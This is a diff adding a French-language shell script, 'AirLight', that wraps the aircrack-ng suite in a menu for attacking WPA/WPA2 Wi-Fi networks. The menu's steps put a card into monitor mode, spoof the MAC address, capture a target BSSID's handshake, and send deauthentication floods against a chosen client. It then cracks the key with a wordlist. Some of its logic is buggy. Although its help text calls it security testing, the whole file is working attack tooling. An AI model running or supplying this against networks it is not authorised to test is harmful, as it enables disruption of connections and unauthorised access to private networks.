@@ -1,0 +1,216 @@
+#!/bin/sh
+
+sudo echo ""
+echo "********************************************************************************"
+echo "***                  \033[1;m    AIRLIGHT v0.1 WPA/WPA2 SECURITY                  \033[0m   ***"
+echo "***      \033[1;m                  by DEAUTHENTIFICATION ATTACK                 \033[0m     ***"
+echo "********************************************************************************"
+echo ""
+echo "       ║  [\033[36m01\033[0m]     \033[36mairmon-ng (configuration de la carte en mode monitoring)\033[0m"
+echo "       ║  [\033[36m02\033[0m]     \033[36mmacchange (changer d'adresse MAC)\033[0m"
+echo "       ║  [\033[36m03\033[0m]     \033[36mairodump-ng (trouver des réseaux)\033[0m"
+echo "       ║"
+echo "       ║  [\033[36m04\033[0m]     \033[36maireplay-ng (attaque par déauthentification)\033[0m"
+echo "       ║  [\033[36m05\033[0m]     \033[36maircrack-ng (chiffrement WPA/WPA2)\033[0m"
+echo "       ║"
+echo "       ║  [\033[36m06\033[0m]     \033[36mHelp\033[0m"
+echo "       ║  [\033[36m07\033[0m]     \033[36mInstall/Reinstall Aircrack-ng, Macchange\033[0m"
+echo "       ║  [\033[36m08\033[0m]     \033[36mKill Monitor Mode\033[0m"
+echo "       ║  [\033[36m09\033[0m]     \033[36mExit\033[0m"
+echo "       ║  "
+read -p "       ╚═══► " prog
+
+if [ $prog -eq 01 ] ; then
+	echo 
+	echo "\033[33m$ iwconfig\033[0m"
+	echo 
+	interface=$(cat /home/$USER/AirLight-master/logs/interface.txt)
+	iwconfig
+	if interface=$(cat /home/$USER/AirLight-master/logs/interface.txt);
+		then read -p "Souhaitez vous utiliser $interface ? [O/n] " ASK 
+		if [ "$ASK" = "n" ] || [ "$ASK" = "N" ]; then 
+			read -p "Quelle interface souhaitez vous utiliser ? : " interface
+		fi
+	else read -p "Aucun log... Quelle interface souhaitez vous utiliser ? : " interface 
+	fi
+	echo $interface > /home/$USER/AirLight-master/logs/interface.txt
+	sleep 1
+	echo
+	echo "\033[33m$ airmon-ng start $interface\033[0m"
+	sudo airmon-ng start $interface
+	read -p "L'interface est-elle correctement configurée ? [O/n] " ALOR
+	if [ "$ALOR" = "n" ] || [ "$ALOR" = "N" ]; then
+		echo ""
+		echo "\033[33m$ iwconfig\033[0m"
+		echo ""
+		iwconfig
+		read -p "Quelle interface souhaitez vous utiliser ? : " interface
+		echo ""
+		echo $interface > /home/$USER/AirLight-master/logs/interface.txt
+		sleep 1
+		echo ""
+		echo "\033[33m$ airmon-ng start $interface\033[0m"
+		sudo airmon-ng start $interface
+		echo ""
+		continue
+	fi
+	read -p "Souhaitez vous lancer AirLight dans un nouveau terminal ? [O/n] " restart
+	if [ "$restart" = "o" ] || [ "$restart" = "O" ]; then
+		gnome-terminal -e "airlight"
+	else
+		continue
+	fi
+	echo "\033[33m$ airodump-ng --encrypt wpa $interface\033[0m"
+	sudo airodump-ng --encrypt wpa $interface
+elif [ $prog -eq 02 ] ;  then
+	echo 
+	echo "\033[33m$ ifconfig\033[0m"
+	echo
+	ifconfig
+	if intermacdown=$(cat /home/$USER/AirLight-master/logs/interface.txt);
+		then read -p "Souhaitez vous utiliser $intermacdown ? [O/n] " ASK 
+		if [ "$ASK" = "n" ] || [ "$ASK" = "N" ]; then 
+			read -p "Quelle interface souhaitez vous utiliser ? : " intermacdown
+		fi
+	else read -p "Aucun log... Quelle interface souhaitez vous utiliser ? : " intermacdown 
+	fi
+	echo
+	echo "\033[33m$ ifconfig $intermacdown down\033[0m"
+	echo
+	sudo ifconfig $intermacdown down
+	echo
+	echo "\033[33m$ ifconfig\033[0m"
+	echo
+	ifconfig
+	echo "\033[33m$ macchanger -a $intermacdown\033[0m"
+	echo
+	sudo macchanger -a $intermacdown
+	echo
+	sleep 1
+	echo "\033[33m$ ifconfig\033[0m"
+	echo
+	ifconfig
+	echo "\033[33m$ ifconfig $intermacdown up\033[0m"
+	sudo ifconfig $intermacdown up
+	ScriptLoc=$(readlink -f "$0")
+	exec "$ScriptLoc"
+elif [ $prog -eq 03 ] ; then
+	echo
+	interface=$(cat /home/$USER/AirLight-master/logs/interface.txt)
+	echo "Interface : "$interface
+	if bssid=$(cat /home/$USER/AirLight-master/logs/bssid.txt);
+		then read -p "Souhaitez vous cibler $bssid ? [O/n] " ASK 
+		if [ "$ASK" = "n" ] || [ "$ASK" = "N" ]; then 
+			read -p "Quelle BSSID souhaitez vous cibler ? : " bssid
+		fi
+	else read -p "Aucun log... Quel BSSID souhaitez vous cibler ? : " bssid 
+	fi
+	echo $bssid > /home/$USER/AirLight-master/logs/bssid.txt
+	if ch=$(cat /home/$USER/AirLight-master/logs/ch.txt);
+		then read -p "Sur le channel $ch ? [O/n] " ASK 
+		if [ "$ASK" = "n" ] || [ "$ASK" = "N" ]; then 
+			read -p "Sur quel channel ? : " ch
+		fi
+	echo
+	else read -p "Aucun log... Quel channel souhaitez vous cibler ? : " bssid 
+	fi
+	echo $ch > /home/$USER/AirLight-master/logs/ch.txt
+	sleep 1
+	read -p "Souhaitez vous lancer AirLight dans un nouveau terminal ? [O/n] " restart
+	if [ "$restart" = "o" ] || [ "$restart" = "O" ]; then
+		gnome-terminal -e "airlight"
+	else
+		continue
+	fi
+	echo "\033[33m$ airodump-ng -w out --encrypt wpa -c $ch --bssid $bssid $interface\033[0m"
+	echo
+	sleep 1
+	sudo airodump-ng -w out --encrypt wpa -c $ch --bssid $bssid $interface
+elif [ $prog -eq 04 ] ;  then
+	sudo echo
+	gnome-terminal -e "airlightdeauth"
+	sudo echo
+	interface=$(cat /home/$USER/AirLight-master/logs/interface.txt)
+	echo "Interface : "$interface
+	bssid=$(cat /home/$USER/AirLight-master/logs/bssid.txt)
+	echo "BSSID : "$bssid
+	if station=$(cat /home/$USER/AirLight-master/logs/station.txt);
+		then read -p "Souhaitez vous cibler $station ? [O/n] " ASK 
+		if [ "$ASK" = "n" ] || [ "$ASK" = "N" ]; then 
+			read -p "Quelle station souhaitez vous cibler ? : " station
+		fi
+	else read -p "Station : " station 
+	fi
+	echo $station > /home/$USER/AirLight-master/logs/station.txt
+	read -p "Appuyez sur une touche pour continuer." xd
+	echo "\033[33m$ aireplay-ng -0 0 -a $bssid -c $station --ignore-negative-one $interface\033[0m"
+	sudo aireplay-ng -0 50 -a $bssid -c $station --ignore-negative-one $interface
+	ScriptLoc=$(readlink -f "$0")
+	exec "$ScriptLoc"
+elif [ $prog -eq 05 ] ; then
+	sudo echo
+	read -p "Dictionnaire Path : " dic
+	read -p "Path du Fichier de Capture : " cap
+	aircrack-ng -w $dic $cap
+	ScriptLoc=$(readlink -f "$0")
+	exec "$ScriptLoc"
+elif [ $prog -eq 06 ] ; then
+	echo 
+	echo "      \033[1m                               HELP                 \033[0m"
+	echo 
+	echo "  Ce script a pour but de reunir les commandes consacrés aux tests de sécurité"
+	echo "  des réseaux WIFI WPA/WPA2 par le biais de la suite aircrack-ng."
+	echo 
+	echo "  Si le programme ne fonctionne pas, vérifiez la procédure d'installation à :"
+	echo "  >> https://github.com/adann0/AirLight/"
+	echo 
+	echo "  Si le programme bug durant le handshake, c'est un probleme 'connu' avec"
+	echo "  aircrack-ng. Tentez l'option [08] Kill Monitor Mode."
+	echo
+	echo "  Pour plus de détails :"
+	echo "  >> https://aircrack-ng.org/"
+	echo "  >> https://github.com/aircrack-ng/aircrack-ng"
+	echo "  >> http://wiki.backtrack-fr.net/index.php/Casser_une_cl%C3%A9_wep/wpa_avec_la_suite_Aircrack-ng"
+	echo
+	read -p "  Souhaitez-vous revenir au menu ? [O/n] " ANS
+	if [ "$ANS" = "o" ] || [ "$ANS" = "O" ] ; then
+		ScriptLoc=$(readlink -f "$0")
+		exec "$ScriptLoc"
+	else
+		exit
+	fi
+elif [ $prog -eq 07 ] ; then
+	echo
+	echo "  Si vous avez une installation de aircrack-ng présente sur cet ordinateur"
+	echo "  celle-ci va être supprimée puis reinstallée. Êtes vous certain de vouloir"
+	read -p "  effectuer ces actions ? [O/n] " ANS
+	if [ "$ANS" = "o" ] || [ "$ANS" = "O" ] ; then
+		cd ~ && rm -rf aircrack-ng
+		sudo apt-get update
+		sudo apt-get remove --purge aircrack-ng -y
+		sudo apt-get update
+		sudo apt-get install libssl-dev -y && sudo apt-get install subversion -y
+		sudo apt-get update
+		sudo apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev libsqlite3-dev libpcre3-dev ethtool shtool rfkill zlib1g-dev libpcap-dev -y
+		sudo apt-get update
+		sudo apt-get install aircrack-ng -y
+		sudo apt-get update
+		sudo apt install macchanger -y
+		sudo apt-get update
+		ScriptLoc=$(readlink -f "$0")
+		exec "$ScriptLoc"
+	else
+		ScriptLoc=$(readlink -f "$0")
+		exec "$ScriptLoc"
+	fi
+elif [ $prog -eq 08 ] ; then
+	interface=$(cat /home/$USER/AirLight-master/logs/interface.txt)
+	echo
+	echo "\033[33m$ airmon-ng stop $interface\033[0m"
+	sudo airmon-ng stop $interface
+	ScriptLoc=$(readlink -f "$0")
+	exec "$ScriptLoc"
+elif [ $prog -eq 09 ] ; then
+	exit
+fi
+
